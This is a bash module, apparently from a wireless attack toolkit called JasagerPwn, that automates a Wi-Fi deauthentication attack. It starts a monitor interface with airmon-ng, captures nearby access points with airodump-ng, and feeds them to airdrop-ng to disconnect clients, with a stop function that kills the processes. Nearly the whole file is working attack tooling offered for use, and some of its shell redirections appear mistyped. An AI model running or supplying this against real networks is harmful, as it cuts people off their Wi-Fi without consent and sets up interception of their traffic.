#
# Airdrop-ng deauthentication module
#
# Author: Leg3nd @ https://leg3nd.me
#
################ Module Configuration ##
title="Airdrop-ng"
# Create a description for menu
description="Airdrop-ng DeAuthentication"
# Letter keys/commands to select item in menu
bindings="A|a"
#########################################

# Variables

# Start Function
function start_airdrop(){
  echo -e "\e[01;34m[>]\e[00m Starting Airdrop-ng DeAuthentication Attack..."
  moncheck=`ifconfig -a | grep mon0`
  if [ ! "$moncheck" ]; then
    xterm -geometry 90x30+464+0 -bg black -fg green -T "[JasagerPwn] v${version} Starting Mon Interface" -e "airmon-ng start $deauth_interface 1> /dev/null 2> /dev/null" &
  fi

  rm /tmp/cap-* 21> /dev/null 2> /dev/null ; sleep 1
  xterm -geometry 90x30+464+0 -bg black -fg green -T "[JasagerPwn] v${version} Capturing APs" -e "airodump-ng -w /tmp/cap -o csv mon0" &
  pid_airodump=`echo $!`
  sleep 10
  xterm -geometry 75x12+464+418 -bg black -fg green -hold -T "[JasagerPwn] v${version} - Airdrop Attack" -e "airdrop-ng -n 2 -b -i mon0 -r /tmp/deauth.conf -t /tmp/cap-01.csv" &
  pid_airdrop=`echo $!`
}

# Stop Function
function stop_airdrop(){
  echo -e "\e[01;34m[>]\e[00m Stopping Airdrop-ng DeAuthentication Attack..."
  xterm -geometry 75x10+464+446 -bg black -fg green -T "JasagerPwn v${version}" -e "kill -9 $pid_airdrop 11> /dev/null 2> /dev/null 21> /dev/null 2> /dev/null ; kill -9 ${pid_airodump} 11> /dev/null 2> /dev/null 21> /dev/null 2> /dev/null"
}